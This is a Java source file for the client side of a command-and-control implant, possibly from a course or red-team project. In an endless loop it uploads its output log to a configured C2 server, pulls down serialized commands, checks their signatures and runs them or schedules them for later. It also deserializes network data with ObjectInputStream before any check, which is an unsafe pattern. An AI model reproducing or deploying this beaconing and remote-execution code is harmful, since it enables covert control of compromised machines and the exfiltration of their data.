import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.Instant;

import commands.Command;
import utils.Config;

public class Client implements AutoCloseable {
    Config cfg;
    PrintStream out = System.out;

    public Client() {
        cfg = Config.restore();
    }

    public void close() {
        cfg.persist();
    }

    public void checkInWithC2() {
        out.flush();
        try {
            URL c2 = new URL(cfg.serverURL + "?" + cfg.id);
            HttpURLConnection conn = (HttpURLConnection) c2.openConnection();
            try (InputStream log = new FileInputStream(".output")) {
                // .output exists, so send logs to server
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                os.write(log.readAllBytes());
                os.flush();
                os.close();

            } catch (FileNotFoundException e) {
                conn.setRequestMethod("GET");
            }

            int response = conn.getResponseCode();
            if (response == HttpURLConnection.HTTP_OK) {
                if (conn.getRequestMethod() == "POST") {
                    // Truncate log file
                    out.close();
                    out = new PrintStream(".output");
                }

                ObjectInputStream in = new ObjectInputStream(conn.getInputStream());
                Command c = (Command) in.readObject();
                verify_and_execute(c);
            }

        } catch (EOFException e) {
            // Ignore
        } catch (Exception e) {
            e.printStackTrace(out);
        }
    }

    public void loopForever() throws FileNotFoundException {
        out = new PrintStream(".output");
        while (true) {
            try {
                cfg.execute(out);
                checkInWithC2();

                out.printf("\nSleeping %d seconds!\n", cfg.sleepDuration);
                Thread.sleep(cfg.sleepDuration * 1000);
            } catch (Exception e) {
                e.printStackTrace(out);
            }
        }
    }

    // Execute if signature is correct
    public void verify_and_execute(Command c) {
        if (!c.recipient.equals(cfg.id) && !c.recipient.equals("ALL")) {
            out.println("! I am not the recipient of this command.");
            out.printf("Me:  %s\nCmd: %s\n", cfg.id, c.recipient);

        } else if (c.verify()) {
            out.println("+ Signature is valid.");
            Instant now = Instant.now();

            if (c.runAfter.isBefore(now)) {
                out.println("+ Executing command:");
                c.display(out);
                c.execute(out, cfg);

            } else {
                out.println("+ Postponing command:");
                c.display(out);
                cfg.pendingCommands.add(c);
            }

        } else {
            out.println("! SIGNATURE IS INVALID?!");
        }
    }

    public static void main(String[] args) {
        try (Client client = new Client()) {

            // No arguments; run forever
            if (args.length == 0) {
                client.loopForever();
            }

            // Update config
            else if (args.length >= 2 && args[0].equals("--set-config")) {
                client.cfg.updateSettings(args[1], System.out);
            }

            // Debug; display config
            else if (args.length >= 1 && args[0].equals("--get-config")) {
                client.cfg.display(System.out);
            }

            // Load and execute a single Command
            else {
                try {
                    FileInputStream fd = new FileInputStream(args[0]);
                    System.out.printf("Loading command from %s\n", args[0]);
                    ObjectInputStream in = new ObjectInputStream(fd);
                    final Command c = (Command) in.readObject();
                    in.close();
                    fd.close();

                    client.verify_and_execute(c);
                } catch (IOException | ClassNotFoundException e) {
                    System.out.printf("Error: %s\n", e.getMessage());
                }
            }

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }
}
